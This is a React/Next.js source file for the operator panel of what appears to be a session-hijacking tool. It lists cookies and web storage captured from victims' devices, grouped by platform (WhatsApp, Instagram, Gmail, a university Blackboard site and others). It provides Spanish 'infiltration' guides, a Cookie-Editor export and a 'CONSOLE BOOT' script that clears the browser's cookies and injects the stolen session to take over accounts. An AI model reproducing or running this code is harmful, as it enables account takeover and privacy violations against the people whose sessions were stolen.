"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import { 
  Search, Clock, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List, Check, Copy,
  Twitter, MessageSquare, Play, AlertCircle, ShoppingCart, Mail, Bot, Monitor, Tablet, Smartphone, Info, RefreshCw, FileJson, Download,
  Youtube, Linkedin, ChevronRight, X, Cpu, Trash2, Key, ArrowLeft, MousePointer2, Zap, Settings, HardDrive
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import Link from "next/link";
import { useParams } from "next/navigation";

export const runtime = 'edge';



interface AccountInfo {
  platform: string;
  identifier: string;
  icon: any;
  color: string;
  health: "active" | "expiring" | "expired";
  domain: string;
}

const RESTORATION_GUIDES: Record<string, { title: string, steps: string[], warning?: string }> = {
  "WhatsApp": {
    title: "Deep Restore: WhatsApp Web",
    steps: [
      "PASO 1: Abre web.whatsapp.com.",
      "PASO 2: Presiona F12 -> Console.",
      "PASO 3: Haz clic en 'CONSOLE BOOT', pégalo y ENTER."
    ],
    warning: "La sesión de WhatsApp es muy volátil."
  },
  "Instagram": {
    title: "Session Injection: Instagram",
    steps: [
      "PASO 1: Instala 'Cookie-Editor'.",
      "PASO 2: LIMPIEZA: Abre instagram.com y BORRA las cookies.",
      "PASO 3: USER-AGENT: Aplica el identificador original.",
      "PASO 4: IMPORTAR: Usa 'EXPORTAR JSON'."
    ]
  },
  "Blackboard": {
    title: "Acceso Forzado: Blackboard",
    steps: [
      "PASO 1: Asegúrate de estar en aulavirtual.up.edu.pe.",
      "PASO 2: APLICA EL USER-AGENT del panel de arriba.",
      "PASO 3: Presiona F12 -> Console.",
      "PASO 4: Haz clic en 'CONSOLE BOOT', pégalo y ENTER."
    ]
  },
  "YouTube": {
    title: "Acceso Premium: YouTube",
    steps: [
      "PASO 1: Abre youtube.com.",
      "PASO 2: Usa 'CONSOLE BOOT' para inyectar la sesión capturada.",
      "PASO 3: Asegúrate de borrar cookies previas si no funciona."
    ]
  },
  "Gmail": {
    title: "Acceso Maestro: Gmail",
    steps: [
      "PASO 1: Abre mail.google.com.",
      "PASO 2: Aplica el User-Agent del panel.",
      "PASO 3: Usa el JSON exportado en Cookie-Editor para importar."
    ],
    warning: "Google pide password si el User-Agent no coincide al 100%."
  }
};

const isNew = (date: string) => {
  const diff = Date.now() - new Date(date).getTime();
  return diff < 15 * 60 * 1000;
};

const formatRelativeTime = (date: string) => {
  const now = new Date();
  const captured = new Date(date);
  const diff = Math.floor((now.getTime() - captured.getTime()) / 1000);
  if (diff < 60) return `hace ${diff}s`;
  if (diff < 3600) return `hace ${Math.floor(diff / 60)}m`;
  if (diff < 86400) return `hace ${Math.floor(diff / 3600)}h`;
  return captured.toLocaleDateString();
};

export default function DeviceControlCenter() {
  const params = useParams();
  const deviceId = params.id as string;
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [webStorage, setWebStorage] = useState<any[]>([]);
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});
  const [copied, setCopied] = useState(false);
  const [copiedJson, setCopiedJson] = useState(false);
  const [copiedUA, setCopiedUA] = useState(false);

  const loadAll = async () => {
    try {
      setLoading(true);
      const { data: sData, error: sErr } = await supabase
        .from("session_snapshots")
        .select("*")
        .eq("device_id", deviceId)
        .order("captured_at", { ascending: false });
      if (sErr) throw sErr;

      if (sData && sData.length > 0) {
        const sIds = sData.map(s => s.id);
        const { data: cRes } = await supabase.from("cookies").select("*").in("snapshot_id", sIds);
        const { data: sRes } = await supabase.from("web_storage").select("*").in("snapshot_id", sIds);
        
        const allC = cRes || [];
        const allS = sRes || [];
        const newMap: Record<string, AccountInfo> = {};
        
        sData.forEach(s => {
          const cs = allC.filter(c => c.snapshot_id === s.id);
          const domains = cs.map(c => c.domain.toLowerCase()).join(" ");
          let platform = "Externo"; let icon = Globe; let color = "text-gray-400"; let domain = "desconocido.com";
          
          if (domains.includes("whatsapp")) { platform="WhatsApp"; icon=MessageSquare; color="text-green-500"; domain="web.whatsapp.com"; }
          else if (cs.find(c => c.name === "ds_user_id") || domains.includes("instagram")) { platform="Instagram"; icon=Instagram; color="text-pink-500"; domain="instagram.com"; }
          else if (domains.includes("facebook")) { platform="Facebook"; icon=Facebook; color="text-blue-500"; domain="facebook.com"; }
          else if (domains.includes("up.edu.pe") || domains.includes("blackboard")) { platform="Blackboard"; icon=GraduationCap; color="text-blue-400"; domain="up.edu.pe"; }
          else if (domains.includes("tiktok")) { platform="TikTok"; icon=Play; color="text-pink-400"; domain="tiktok.com"; }
          else if (domains.includes("youtube")) { platform="YouTube"; icon=Youtube; color="text-red-600"; domain="youtube.com"; }
          else if (domains.includes("mail.google")) { platform="Gmail"; icon=Mail; color="text-red-400"; domain="gmail.com"; }
          else if (domains.includes("drive.google")) { platform="Drive"; icon=HardDrive; color="text-yellow-500"; domain="drive.google.com"; }
          else if (domains.includes("google")) { platform="Google"; icon=Globe; color="text-blue-400"; domain="google.com"; }
          else if (domains.includes("linkedin")) { platform="LinkedIn"; icon=Linkedin; color="text-blue-600"; domain="linkedin.com"; }
          else if (domains.includes("netflix")) { platform="Netflix"; icon=Play; color="text-red-600"; domain="netflix.com"; }
          
          // Si no detectamos el dominio, usamos el primero que encontremos
          if (platform === "Externo" && cs.length > 0) {
            domain = cs[0].domain.replace(/^\./, "");
            platform = domain.split('.')[0].toUpperCase();
          }

          newMap[s.id] = { platform, icon, color, health: "active", domain, identifier: s.user_id };
        });

        setAccountMap(newMap);
        setSessions(sData); // Mostramos TODO, sin filtrar por ALLOWED
        if (sData.length > 0) handleSelect(sData[0]);
      }
    } catch (e: any) {
      setError(e.message);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => { loadAll(); }, [deviceId]);

  const handleSelect = async (s: SessionSnapshot) => {
    setSelectedSession(s);
    const { data: c } = await supabase.from("cookies").select("*").eq("snapshot_id", s.id);
    const { data: st } = await supabase.from("web_storage").select("*").eq("snapshot_id", s.id);
    setCookies(c || []); setWebStorage(st || []);
  };

  const copyUA = () => { if (selectedSession) navigator.clipboard.writeText(selectedSession.user_agent || "").then(() => { setCopiedUA(true); setTimeout(()=>setCopiedUA(false), 3000); }); };
  
  const copyJson = () => {
    if (!selectedSession) return;
    const t = accountMap[selectedSession.id]?.domain.toLowerCase() || "";
    const f = cookies.map(c => ({
        domain: c.domain.startsWith('.') ? c.domain : (c.domain.includes('.') ? "." + c.domain : c.domain),
        expirationDate: Math.floor(Date.now() / 1000) + 86400 * 90,
        hostOnly: !c.domain.startsWith('.'),
        httpOnly: c.http_only,
        name: c.name,
        path: c.path || "/",
        sameSite: c.same_site === 'no_restriction' ? 'no_restriction' : 'lax',
        secure: true,
        session: false,
        value: (c.value || "").replace(/^"|"$/g, "").replace(/\\([0-7]{3})/g, (m, o) => String.fromCharCode(parseInt(o, 8)))
    }));
    navigator.clipboard.writeText(JSON.stringify(f, null, 2)).then(() => { setCopiedJson(true); setTimeout(() => setCopiedJson(false), 5000); });
  };

  const copyConsole = () => {
    const ls = webStorage.filter(s => s.storage_type === 'localstorage');
    const ss = webStorage.filter(s => s.storage_type === 'sessionstorage');
    const sStr = `(function(){
      const c=${JSON.stringify(cookies)};
      const ls=${JSON.stringify(ls)};
      const ss=${JSON.stringify(ss)};
      console.log('%c EDU-SYNC BOOT ACTIVATED ', 'background: #222; color: #bada55; font-size: 20px;');
      
      document.cookie.split(";").forEach(x=>{
        const n=x.split("=")[0].trim();
        document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        document.cookie = n + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/; domain=" + location.hostname;
      });
      localStorage.clear(); sessionStorage.clear();

      c.forEach(x=>{
        try {
          let extra = "; domain=" + x.domain;
          if (x.name.startsWith('__Host-')) extra = ""; 
          document.cookie = x.name + "=" + x.value + extra + "; path=" + (x.path||"/") + "; SameSite=" + (x.same_site === 'no_restriction' ? 'None' : 'Lax') + "; Secure";
        } catch(e){}
      });

      ls.forEach(x=>{try{localStorage.setItem(x.key,x.value)}catch(e){}});
      ss.forEach(x=>{try{sessionStorage.setItem(x.key,x.value)}catch(e){}});

      console.log('Completado. Recargando...');
      setTimeout(()=>location.reload(), 2000);
    })()`;
    navigator.clipboard.writeText(sStr).then(() => { setCopied(true); setTimeout(() => setCopied(false), 5000); });
  };

  return (
    <div className="min-h-screen bg-[#050505] text-white flex overflow-hidden">
        <aside className="w-[400px] border-r border-white/5 bg-black/40 flex flex-col shadow-2xl">
          <div className="p-10 border-b border-white/5 space-y-8">
            <Link href="/" className="px-4 py-2 bg-blue-500/10 text-blue-400 text-[10px] font-black uppercase rounded-lg border border-blue-500/20 inline-flex items-center gap-2 shadow-lg hover:bg-blue-500/20 transition-all"><ArrowLeft size={14}/> Dashboard</Link>
            <div className="flex items-center gap-5">
              <div className="w-14 h-14 bg-blue-500/20 rounded-2xl flex items-center justify-center text-blue-400 border border-blue-500/10 shadow-lg"><Monitor size={28}/></div>
              <div>
                 <h2 className="text-xl font-black uppercase tracking-tight truncate max-w-[200px]">{sessions.length>0?sessions[0].pc_name:"Investigando..."}</h2>
                 <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest">{sessions.length} Snapshots</p>
              </div>
            </div>
          </div>
          <div className="flex-1 overflow-y-auto p-6 space-y-4 custom-scrollbar">
            {loading ? <p className="p-10 text-[10px] uppercase font-black opacity-20 animate-pulse">Sincronizando con el nodo...</p> : 
             sessions.length === 0 ? <p className="p-10 text-[10px] uppercase font-black opacity-20">No hay datos en este nodo.</p> :
             sessions.map(s => (
               <button key={s.id} onClick={()=>handleSelect(s)} className={`w-full text-left p-6 rounded-[2rem] border transition-all relative group ${selectedSession?.id===s.id?'bg-blue-600 border-blue-500 shadow-xl':'bg-white/[0.02] border-white/5 opacity-40 hover:opacity-100'}`}>
                 {isNew(s.captured_at) && (
                    <div className="absolute top-4 right-4 flex items-center gap-1 bg-emerald-500 text-white text-[8px] font-black px-2 py-0.5 rounded-full animate-pulse shadow-lg shadow-emerald-500/20">
                       <Zap size={10} fill="currentColor"/> NUEVO
                    </div>
                 )}
                 <div className="flex items-center gap-4">
                   <div className="p-3 bg-black/30 rounded-xl group-hover:scale-110 transition-transform">{React.createElement(accountMap[s.id]?.icon || Globe, { size: 20, className: selectedSession?.id===s.id? 'text-white' : accountMap[s.id]?.color })}</div>
                   <div>
                      <p className="font-black text-xs uppercase tracking-wider">{accountMap[s.id]?.platform}</p>
                      <p className={`text-[9px] font-bold uppercase flex items-center gap-2 ${selectedSession?.id===s.id ? 'text-white/60' : 'text-gray-400'}`}>
                        <Clock size={10}/> {formatRelativeTime(s.captured_at)}
                      </p>
                   </div>
                 </div>
               </button>
             ))}
          </div>
        </aside>

        <main className="flex-1 overflow-y-auto p-12 custom-scrollbar bg-[#050505] relative space-y-12">
          {selectedSession && (
            <div className="p-6 bg-yellow-500/10 border border-yellow-500/20 rounded-[2.5rem] flex items-center justify-between shadow-2xl">
               <div className="flex items-center gap-6">
                  <div className="w-14 h-14 rounded-2xl bg-yellow-500/20 flex items-center justify-center text-yellow-500 shadow-inner"><Shield size={28}/></div>
                  <div>
                    <h4 className="text-sm font-black uppercase tracking-widest text-yellow-500">REQUISITO OBLIGATORIO: USER-AGENT</h4>
                    <p className="text-[10px] text-gray-400 font-bold uppercase truncate max-w-[600px] mt-1">{selectedSession.user_agent}</p>
                  </div>
               </div>
               <button onClick={copyUA} className="px-8 py-4 bg-yellow-500 text-black text-[11px] font-black uppercase rounded-2xl hover:bg-yellow-400 transition-all active:scale-95 shadow-xl shadow-yellow-500/20">
                  {copiedUA ? '¡COPIADO!' : 'COPIAR IDENTIFICADOR'}
               </button>
            </div>
          )}

          <AnimatePresence mode="wait">
            {selectedSession ? (
              <motion.div key={selectedSession.id} initial={{opacity:0,y:20}} animate={{opacity:1,y:0}} className="space-y-12">
                <div className="flex items-center justify-between border-b border-white/5 pb-12">
                   <div className="flex items-center gap-10">
                      <div className={`w-28 h-28 rounded-[3.5rem] bg-black/60 border border-white/10 flex items-center justify-center shadow-2xl ${accountMap[selectedSession.id]?.color}`}>{React.createElement(accountMap[selectedSession.id]?.icon || Globe, { size: 56 })}</div>
                      <div>
                        <div className="flex items-center gap-5">
                          <h1 className="text-6xl font-black uppercase tracking-tighter">{accountMap[selectedSession.id]?.platform}</h1>
                          {isNew(selectedSession.captured_at) && <span className="px-6 py-1.5 bg-emerald-500 text-white text-[11px] font-black rounded-full animate-pulse shadow-lg shadow-emerald-500/20">RECIENTE</span>}
                        </div>
                        <p className="text-blue-400 font-black text-base uppercase tracking-[0.2em] mt-2">{accountMap[selectedSession.id]?.domain}</p>
                      </div>
                   </div>
                   <div className="flex gap-6">
                      <div className="p-8 bg-white/[0.02] rounded-[2.5rem] border border-white/5 text-center min-w-[140px] shadow-lg"><p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.3em] mb-2">COOKIES</p><p className="text-4xl font-black">{cookies.length}</p></div>
                      <div className="p-8 bg-white/[0.02] rounded-[2.5rem] border border-white/5 text-center min-w-[140px] shadow-lg"><p className="text-[10px] font-black text-gray-500 uppercase tracking-[0.3em] mb-2">STORAGE</p><p className="text-4xl font-black">{webStorage.length}</p></div>
                   </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-12">
                   <div className="space-y-10">
                      <div className="p-10 rounded-[4rem] border border-white/10 bg-white/[0.02] space-y-8 shadow-2xl">
                         <h3 className="text-2xl font-black uppercase tracking-widest text-blue-400 flex items-center gap-4"><List size={24}/> Guía de Infiltración</h3>
                         <div className="space-y-8">
                            {RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform] ? (
                               RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform].steps.map((st, i)=>(<div key={i} className="flex gap-6 items-start"><div className="w-8 h-8 rounded-2xl bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs font-black shrink-0 border border-blue-500/10 shadow-lg">{i+1}</div><p className="text-sm font-bold text-gray-300 leading-relaxed">{st}</p></div>))
                            ) : (
                               [
                                "PASO 1: Abre el dominio capturado.",
                                "PASO 2: Aplica el User-Agent del panel superior.",
                                "PASO 3: Usa 'CONSOLE BOOT' para inyectar Cookies y Storage.",
                                "PASO 4: Refresca la ventana objetivo."
                               ].map((st, i)=>(<div key={i} className="flex gap-6 items-start"><div className="w-8 h-8 rounded-2xl bg-blue-500/20 text-blue-400 flex items-center justify-center text-xs font-black shrink-0 border border-blue-500/10 shadow-lg">{i+1}</div><p className="text-sm font-bold text-gray-300 leading-relaxed">{st}</p></div>))
                            )}
                            {RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform]?.warning && <div className="p-6 bg-red-500/10 rounded-[2rem] flex gap-4 text-red-500 text-[11px] font-black uppercase border border-red-500/20 shadow-lg animate-pulse"><AlertCircle size={20}/><p>{RESTORATION_GUIDES[accountMap[selectedSession.id]?.platform].warning}</p></div>}
                         </div>
                      </div>
                      <button onClick={copyJson} className="w-full p-10 rounded-[3rem] bg-indigo-500/10 border border-indigo-500/20 flex items-center justify-center gap-6 transition-all active:scale-95 hover:bg-indigo-500/20 shadow-2xl">
                        <FileJson size={32} className="text-indigo-400"/>
                        <div className="text-left">
                           <span className="block text-sm font-black uppercase tracking-[0.2em] text-indigo-400">{copiedJson ? '¡DICCIONARIO COPIADO!' : 'EXPORTAR SESIÓN (JSON)'}</span>
                           <span className="text-[10px] font-bold text-indigo-400/50 uppercase">Compatible con Cookie-Editor</span>
                        </div>
                      </button>
                   </div>

                   <div className="space-y-10">
                      <button onClick={copyConsole} className={`w-full py-28 rounded-[5rem] text-4xl font-black shadow-2xl transition-all active:scale-95 flex flex-col items-center justify-center gap-6 border-b-8 border-black/40 ${copied ? 'bg-emerald-600' : 'bg-blue-600 hover:bg-blue-500'}`}>
                         <div className="flex items-center gap-6"><Zap size={48} fill="currentColor" className={copied ? 'animate-bounce' : 'animate-pulse'}/> {copied ? '¡LISTO PARA PEGAR!' : 'CONSOLE BOOT'}</div>
                         <span className="text-[11px] uppercase font-black tracking-[0.4em] opacity-40">{copied ? 'Pégalo en el sitio objetivo ahora' : 'INYECCIÓN DE ESTADO COMPLETO'}</span>
                      </button>
                      <div className="p-10 rounded-[4rem] border border-white/5 bg-black/40 h-[400px] flex flex-col relative overflow-hidden shadow-inner">
                        <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-blue-500 via-purple-500 to-emerald-500"></div>
                        <p className="text-[11px] font-black text-gray-500 uppercase tracking-[0.3em] mb-6 flex items-center gap-3"><Clock size={14}/> Análisis de Evidencia Capturada</p>
                        <div className="flex-1 overflow-y-auto space-y-3 custom-scrollbar pr-6">
                           {cookies.slice(0, 50).map((c,i)=>(<div key={i} className="p-4 bg-white/[0.02] rounded-2xl border border-white/5 flex justify-between items-center text-[10px] font-mono group hover:bg-white/[0.05] transition-colors"><span className="text-white/20 truncate max-w-[150px]">{c.domain}</span><span className="font-black text-blue-400 truncate">{c.name}</span></div>))}
                        </div>
                      </div>
                   </div>
                </div>
              </motion.div>
            ) : !loading && (
               <div className="h-full flex flex-col items-center justify-center space-y-8 opacity-10">
                  <Monitor size={120} strokeWidth={1}/>
                  <div className="text-center space-y-4">
                     <p className="text-4xl font-black uppercase tracking-[0.3em]">Selecciona Inteligencia</p>
                     <p className="text-sm font-bold uppercase tracking-widest opacity-50">Explora una de las {sessions.length} transmisiones en espera</p>
                  </div>
               </div>
            )}
          </AnimatePresence>
        </main>
    </div>
  );
}
